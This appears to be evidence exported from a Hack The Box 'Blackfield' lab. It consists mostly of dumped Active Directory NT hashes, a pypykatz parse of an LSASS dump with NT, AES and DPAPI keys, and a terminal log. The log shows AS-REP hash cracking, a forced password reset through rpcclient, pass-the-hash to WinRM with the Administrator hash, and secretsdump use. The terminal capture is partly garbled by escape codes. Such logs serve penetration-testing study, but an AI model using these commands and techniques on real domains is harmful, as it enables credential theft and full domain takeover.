BLACKFIELD.local\BLACKFIELD397679:1395:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD842438:1396:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD286615:1397:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD224839:1398:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD631599:1399:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD247450:1400:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD290582:1401:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD657263:1402:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD314351:1403:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD434395:1404:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD410243:1405:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD307633:1406:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD758945:1407:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD541148:1408:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD532412:1409:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD996878:1410:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD653097:1411:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD438814:1412:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
svc_backup:1413:aad3b435b51404eeaad3b435b51404ee:9658d1d1dcd9250115e2205d9f48400d:::
BLACKFIELD.local\lydericlefebvre:1414:aad3b435b51404eeaad3b435b51404ee:a2bc62c44415e12302885d742b0a6890:::
PC01$:1415:aad3b435b51404eeaad3b435b51404ee:de1e7748b6b292bfff4fd5adb54b4608:::
PC02$:1416:aad3b435b51404eeaad3b435b51404ee:9cd62550f6042af1d85b38f608edef7a:::
PC03$:1417:aad3b435b51404eeaad3b435b51404ee:86f46da5167729c9e258b63daa2eb299:::
PC04$:1418:aad3b435b51404eeaad3b435b51404ee:1b8af9e72f9bd07af393f824a75bb65b:::
PC05$:1419:aad3b435b51404eeaad3b435b51404ee:897a3aa7ce0d53ef1402be63105440a9:::
PC06$:1420:aad3b435b51404eeaad3b435b51404ee:91eeb06d11d82cb6d745f11af78ed9f6:::
PC07$:1421:aad3b435b51404eeaad3b435b51404ee:c0f006c96344a09e6c124df4b953a946:::
PC08$:1422:aad3b435b51404eeaad3b435b51404ee:cd4a9354602e28b34906e0d5cc55124a:::
PC09$:1423:aad3b435b51404eeaad3b435b51404ee:c1fa1cce0fc36e357677478dc4cbfb1d:::
PC10$:1424:aad3b435b51404eeaad3b435b51404ee:9526e0338897f4f124b48b208f914edc:::
PC11$:1425:aad3b435b51404eeaad3b435b51404ee:08453b2b98a2da1599e93ec639a185f8:::
PC12$:1426:aad3b435b51404eeaad3b435b51404ee:8c2548fa91bdf0ebad60d127d54e82c1:::
PC13$:1427:aad3b435b51404eeaad3b435b51404ee:5b3468bd451fc7e6efae47a5a21fb0f4:::
SRV-WEB$:1428:aad3b435b51404eeaad3b435b51404ee:48e7b5032d884aed3a64ba6d578bbfbc:::
SRV-FILE$:1429:aad3b435b51404eeaad3b435b51404ee:6e46f924ac2066e3d6c594262b969535:::
SRV-EXCHANGE$:1430:aad3b435b51404eeaad3b435b51404ee:93d9144d68086d3b94907107e928b961:::
SRV-INTRANET$:1431:aad3b435b51404eeaad3b435b51404ee:e9d6ae78b303e80c7ea724a2ccf28c51:::
```

#### `loot/secretsdump.ntds.cleartext`

```text

```

### Sensitive transcript evidence

```text
[sudo] password for kali:
  -format hashcat \
$ [19:25:18] hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt \
  --potfile-path loot/hashcat.pot \
kali@kali:~/Platforms/HackTheBox/Blackfield [19:25:09] $ [?1h=[?2004hhashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt \
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Parsed Hashes: 1/1 (100.00%)
Hashes: 1 digests; 1 unique digests, 1 unique salts
* Passwords.: 14344385
  https://hashcat.net/faq/wrongdriver
$ [19:26:29] boxset Password '#00^BlackKnight'
$ [19:26:35] loot cred $Username $Password
  https://hashcat.net/faq/morework
Session..........: hashcat
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:a141b5c3e6db...6eada7
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
kali@kali:~/Platforms/HackTheBox/Blackfield [19:26:22] $ [?1h=[?2004hboxset Password '#00^BlackKnight'boxset'#00^BlackKnight'[?1l>[?2004l
[+] Password=#00^BlackKnight (saved to .env)
kali@kali:~/Platforms/HackTheBox/Blackfield [19:26:29] $ [?1h=[?2004hloot cred $Username $Passwordloot[?1l>[?2004l
$ [19:27:38] netexec smb $BoxIP -u $Username -p $Password -d $Domain
$ [19:27:44] netexec winrm $BoxIP -u $Username -p $Password -d $Domain
$ [19:28:42] bloodhound-python -d $Domain -u $Username -p $Password -ns $BoxIP -c all \
kali@kali:~/Platforms/HackTheBox/Blackfield [19:26:35] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Blackfield [19:27:39] $ [?1h=[?2004hnetexec winrm $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Blackfield [19:27:45] $ [?1h=[?2004hbloodhound-python -d $Domain -u $Username -p $Password -ns $BoxIP -c all \
kali@kali:~/Platforms/HackTheBox/Blackfield [19:30:21] $ [?1h=[?2004hbbbloodhound &blblooooddhhoouunndbloodhoundd- bloodhound-python -d $Domain -u $Username -p $Password -ns $BoxIP -c all \
  "$Domain/$Username:$Password"
  "$Domain/$Username:$Password"dacledit.py'audit2020'"$Domain/$Username:$Password"[?1l>[?2004l
[*]     ACE flags                 : None
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Change-Password (ab721a53-1e2f-11d0-9819-00aa0040529b)
[*]     Object type (GUID)        : User-Force-Change-Password (00299570-246d-11d0-a768-00aa006e0529)
[*]     Object type (GUID)        : Token-Groups-Global-And-Universal (46a9b11d-60ae-405a-b7e8-ff8a58d456d2)
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Object type (GUID)        : ms-DS-Key-Credential-Link (5b47d60f-6090-40b2-9f37-2a4de88f3063)
[*]     Object type (GUID)        : Token-Groups (b7c69e6d-2cc7-11d2-854e-00a0c983f608)
[*]     Flags                     : ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
$ [19:34:30] rpcclient -U "$Domain/$Username%$Password" $BoxIP \
kali@kali:~/Platforms/HackTheBox/Blackfield [19:32:09] $ [?1h=[?2004hrpcclient -U "$Domain/$Username%$Password" $BoxIP \
  -c "setuserinfo2 audit2020 23 'Passw0rd123!'"rpcclient"$Domain/$Username%$Password""setuserinfo2 audit2020 23 'Passw0rd123!'"[?1l>[?2004l
$ [19:35:52] boxset Password2 'Passw0rd123!'
$ [19:35:58] loot cred $Username2 $Password2
$ [19:36:07] smbclient //$BoxIP/forensic -U "$Domain/$Username2" --password="$Password2"
kali@kali:~/Platforms/HackTheBox/Blackfield [19:35:46] $ [?1h=[?2004hboxset Password2 'Passw0rd123!'boxset'Passw0rd123!'[?1l>[?2004l
[+] Password2=Passw0rd123! (saved to .env)
kali@kali:~/Platforms/HackTheBox/Blackfield [19:35:52] $ [?1h=[?2004hloot cred $Username2 $Password2loot[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Blackfield [19:35:58] $ [?1h=[?2004hsmbclient //$BoxIP/forensic -U "$Domain/$Username2" --password="$Password2"smbclient"$Domain/$Username2""$Password2"[?1l>[?2004l
--usernamedomainnamepasswordpassword====Username:Domain:AES128AES256==usernamedomainnamepasswordpassword
--usernamedomainnamepasswordpassword====Username:Domain:AES128AES256==usernamedomainnamepasswordpassword==
        == WDIGEST [633ba]==username svc_backup  domainname BLACKFIELDNone password (hex)
        == WDIGEST [25869]==username Administratordomainname BLACKFIELDNone         password (hex)
mword====Username:Domain:AES128AES256==usernamedomainnamepasswordpassword
$ [19:39:32] loot hash svc_backup 9658d1d1dcd9250115e2205d9f48400d
$ [19:39:38] loot hash Administrator 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
$ [19:39:56] boxset AdminHash 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
$ [19:40:39] netexec winrm $BoxIP -u $AdminUser -H $AdminHash -d $Domain
zsh: command not found: password
kali@kali:~/Platforms/HackTheBox/Blackfield [19:39:21] $ [?1h=[?2004hloot hash svc_backup 9658d1d1dcd9250115e2205d9f48400dloot[?1l>[?2004l
[+] Hash saved:  svc_backup:9658d1d1dcd9250115e2205d9f48400d  →  loot/hashes.txt
kali@kali:~/Platforms/HackTheBox/Blackfield [19:39:32] $ [?1h=[?2004hloot hash Administrator 7f1e4ff8c6a8e6b6fcae2d9c0572cd62loot[?1l>[?2004l
[+] Hash saved:  Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62  →  loot/hashes.txt
kali@kali:~/Platforms/HackTheBox/Blackfield [19:39:50] $ [?1h=[?2004hboxset AdminHash 7f1e4ff8c6a8e6b6fcae2d9c0572cd62boxset[?1l>[?2004l
[+] AdminHash=7f1e4ff8c6a8e6b6fcae2d9c0572cd62 (saved to .env)
kali@kali:~/Platforms/HackTheBox/Blackfield [19:39:56] $ [?1h=[?2004hnetexec winrm $BoxIP -u $AdminUser -H $AdminHash -d $Domainnetexec[?1l>[?2004l
$ [19:41:38] boxset SvcHash 9658d1d1dcd9250115e2205d9f48400d
kali@kali:~/Platforms/HackTheBox/Blackfield [19:40:48] $ [?1h=[?2004hboxset SvcHash 9658d1d1dcd9250115e2205d9f48400dboxset[?1l>[?2004l
[+] SvcHash=9658d1d1dcd9250115e2205d9f48400d (saved to .env)
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
$ [19:45:09] loot flag user 3920bb317a0bef51027e2852be64b543
kali@kali:~/Platforms/HackTheBox/Blackfield [19:45:08] $ [?1h=[?2004hloot flag user 3920bb317a0bef51027e2852be64b543loot[?1l>[?2004l
[+] Flag saved:  user = 3920bb317a0bef51027e2852be64b543  →  loot/flags.txt
    from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, \
$ [19:52:34] find /home/kali/.local -name "secretsdump.py" 2>/dev/null
kali@kali:~/Platforms/HackTheBox/Blackfield [19:52:06] $ [?1h=[?2004hfind /home/kali/.local -name "secretsdump.py" 2>/dev/nullfind /home/kali/.local"secretsdump.py" 2>/dev/null[?1l>[?2004l
$ [19:52:58] /home/kali/.local/share/pipx/venvs/impacket/bin/secretsdump.py \
```

### Additional captured source values

#### `loot/pypykatz.txt`

```text
INFO:pypykatz:Parsing file loot/lsass.DMP
FILE: ======== loot/lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
		AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
		AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5950b]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [5950b]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [593b5]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [593b5]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 257142 (3ec76)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.318909+00:00
sid S-1-5-18
luid 257142
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
	== MSV ==
		Username: Administrator
		Domain: BLACKFIELD
		LM: NA
		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
		DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
	== WDIGEST [25869]==
		username Administrator
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: Administrator
		Domain: BLACKFIELD.LOCAL
		AES128 Key: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		AES256 Key: ec841e1e29ad7d6332a243b6b4ab445839829244408269850ab7c78a2cf45615
	== WDIGEST [25869]==
		username Administrator
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [25869]==
		luid 153705
		key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
		masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
		sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9

== LogonSession ==
authentication_id 137110 (21796)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.068590+00:00
sid S-1-5-18
luid 137110
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134695 (20e27)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.678019+00:00
sid S-1-5-18
luid 134695
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 40310 (9d76)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40310
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [9d76]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [9d76]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 40232 (9d28)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40232
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [9d28]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [9d28]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:46.725846+00:00
sid S-1-5-20
luid 996
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [3e4]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: dc01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: ae7032a985fe7303c182f82d15df15b1ccf731c7f33947e3bd2f193d12d9d684
	== WDIGEST [3e4]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24410 (5f5a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-1
luid 24410
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5f5a]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [5f5a]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
	== WDIGEST [633e3]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
		AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
		AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
	== WDIGEST [633e3]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [633e3]==
		luid 406499
		key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
		masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
		sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991

== LogonSession ==
authentication_id 366665 (59849)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366665
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [59849]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
		AES128 Key: b624dc83a27cc29da11d9bf25efea796
		AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
	== WDIGEST [59849]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 366649 (59839)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366649
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [59839]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
